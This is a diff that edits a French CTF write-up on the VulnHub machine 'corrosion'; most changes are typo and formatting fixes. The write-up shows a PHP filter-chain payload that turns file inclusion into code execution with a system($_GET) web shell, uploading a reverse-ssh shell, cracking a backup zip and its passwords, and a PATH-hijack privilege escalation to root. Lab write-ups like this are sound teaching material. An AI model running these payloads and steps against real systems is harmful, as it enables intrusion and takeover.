@@ -55,7 +55,7 @@ http://192.168.56.38/blog-post/archives/randylogs.php?file=/un/path/quelconque
 Kansas City Shuffle
 -------------------
 
-La technique que j'ai utiliser à la place de la simple injection dans le fichier de log semble avoir été d'abord publiée [sur Gist par un certain loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) sans tambours ni trompettes ce qui semble bien dommage.  
+La technique que j'ai utilisé à la place de la simple injection dans le fichier de log semble avoir été d'abord publiée [sur Gist par un certain loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) sans tambours ni trompettes ce qui semble bien dommage.  
 
 L'équipe *Synacktiv* a depuis publié [un outil plus avancé](https://github.com/synacktiv/php_filter_chain_generator) pour profiter de cette technique qui permet de transformer directement une LFI en RCE (remote code execution) sans se baser sur la présence du moindre fichier sur la cible.  
 
@@ -85,27 +85,25 @@ Dans la pratique je peux générer mon payload de cette façon :
 python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
 ```
 
-Et l'intégrer dans l'URL qui ressemblera à ceci (output tronqué) :
+Et l'intégrer dans l'URL qui ressemblera à ceci :  
 
-```
+```plain
 http://192.168.56.38/blog-post/archives/randylogs.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|--- snip ---|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&c=id
 ```
 
-Je vous fait grâce de l'URL complète longue de 5860 octets. Heureusement suffisamment courte pour être acceptée par le serveur web.
+Je vous fait grâce de l'URL complète longue de 5860 octets. Heureusement suffisamment courte pour être acceptée par le serveur web.  
 
-Après upload et exécution de [reverse-ssh](https://github.com/Fahrj/reverse-ssh) il est temps de fouiller un peu sur le système.
+Après upload et exécution de [reverse-ssh](https://github.com/Fahrj/reverse-ssh) il est temps de fouiller un peu sur le système.  
 
 On my way
 ---------
 
+Je m'intéresse aussitôt à l'utilisateur *randy*, seul rempart visible avant *root*. Cet utilisateur n'a toutefois aucun dossier ni fichier world-readable...  
 
-Je m'intéresse aussitôt à l'utilisateur randy, seul rempart visible avant root. Cet utilisateur n'a toutefois aucun dossier ni fichier world-readable...
+Dans les logs je retrouve effectivement le auth.log qui était lisible mais dont je n'ai pas eu besoin   
 
-Dans les logs je retrouve effectivement le auth.log qui était lisible mais dont je n'ai pas eu besoin
-
-
-```
-www-data@corrosion:/home$ find /var/log/ -type f -readable 2>/dev/null
+```plain
+www-data@corrosion:/home$ find /var/log/ -type f -readable 2>/dev/null 
 /var/log/alternatives.log
 /var/log/wtmp
 /var/log/bootstrap.log
@@ -126,13 +124,11 @@ www-data@corrosion:/home$ find /var/log/ -type f -readable 2>/dev/null
 /var/log/alternatives.log.1
 ```
 
+Les processus, les ports en écoute ou encore les binaires setuid n'ont rien qui sort de l'ordinaire... Je décide de sortir un [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) histoire d'automatiser l'énumération.  
 
-Les processus, les ports en écoute ou encore les binaires setuid n'ont rien qui sort de l'ordinaire... Je décide de sortir un LinPEAS histoire d'automatiser l'énumération.
+Ce dernier indique que le système est potentiellement vulnérable à la faille Sudo Baron Samedit (devenue un running gag des CTFs) mais surtout retrouve une archive intéressante dans */var/backups/* :  
 
-Ce dernier indique que le système est potentiellement vulnérable à la faille Sudo Baron Samedit (devenue un running gag des CTFs) mais surtout retrouve une archive intéressante dans /var/backups/ :
-
-
-```
+```plain
 www-data@corrosion:/tmp$ unzip -l /var/backups/user_backup.zip
 Archive:  /var/backups/user_backup.zip
   Length      Date    Time    Name
@@ -145,21 +141,16 @@ Archive:  /var/backups/user_backup.zip
      3324                     4 files
 ```
 
-
-L'archive étant protégée par mot de passe il faut passer par zip2john puis JtR pour obtenir le password (*!randybaby*). Le fichier texte dans l'archive contient lui même le mot de passe SSH de l'utiisateur randy (*randylovesgoldfish1998*)
-
-
+L'archive étant protégée par mot de passe il faut passer par zip2john puis JtR pour obtenir le password (*!randybaby*). Le fichier texte dans l'archive contient lui même le mot de passe SSH de l'utiisateur randy (*randylovesgoldfish1998*)  
 
 Musique classique
 -----------------
 
+L'accès permet la récupération du premier flag (98342721012390839081). Là on remarque que l'on peut exécuter un binaire avec les droits de l'utilisateur root :  
 
-L'accès permet la récupération du premier flag (*98342721012390839081*). Là on remarque que l'on peut exécuter un binaire avec les droits de l'utilisateur root :
-
-
-```
+```plain
 randy@corrosion:~$ sudo -l
-[sudo] password for randy:
+[sudo] password for randy: 
 Matching Defaults entries for randy on corrosion:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -167,8 +158,7 @@ User randy may run the following commands on corrosion:
     (root) PASSWD: /home/randy/tools/easysysinfo
 ```
 
-
-On dispose du code source puisqu'il était lui aussi présent dans l'archive :
+On dispose du code source puisqu'il était lui aussi présent dans l'archive :  
 
 ```c
 #include<unistd.h>
@@ -184,13 +174,11 @@ void main()
 }
 ```
 
+Cela ressemble à une faille de PATH classique car le programme *cat* est appelé sans chemin absolu toutefois ce n'est normalement pas exploitable via sudo qui ne préserve pas l'environnement par défaut.  
 
-Cela ressemble à une faille de PATH classique car le programme cat est appelé sans chemin absolu toutefois ce n'est normalement pas exploitable via sudo qui ne préserve pas l'environnement par défaut.
+Il s'avère en fait que le binaire est aussi setuid root par conséquent l'exploitation est possible directement.  
 
-Il s'avère en fait que le binaire est aussi setuid root par conséquent l'exploitation est possible directement.
-
-
-```
+```plain
 randy@corrosion:~/tools$ export PATH=/home/randy/tools:$PATH
 randy@corrosion:~/tools$ vi /etc/hosts
 randy@corrosion:~/tools$ cp /bin/bash cat
@@ -198,24 +186,20 @@ randy@corrosion:~/tools$ ./easysysinfo
 Thu Oct 27 12:42:40 PM MDT 2022
 root@corrosion:~/tools# id
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),121(lpadmin),133(sambashare),1000(randy)
-```
 
-```
-root@corrosion:/root# cat root.txt
-FLAG: 4NJSA99SD7922197D7S90PLAWE
+root@corrosion:/root# cat root.txt 
+FLAG: 4NJSA99SD7922197D7S90PLAWE 
 
-Congrats! Hope you enjoyed my first machine posted on VulnHub!
+Congrats! Hope you enjoyed my first machine posted on VulnHub! 
 Ping me on twitter @proxyprgrammer for any suggestions.
 
 Youtube: https://www.youtube.com/c/ProxyProgrammer
 Twitter: https://twitter.com/proxyprgrammer
 ```
 
+Dans la crontab de root on peut faire l'entrée qui fixait les permissions laxistes sur le fichier de log :  
 
-Dans la crontab de root on peut faire l'entrée qui fixait les permissions laxistes sur le fichier de log :
-
-
-```
+```plain
 root@corrosion:/root# crontab -l
 # m h  dom mon dow   command
 
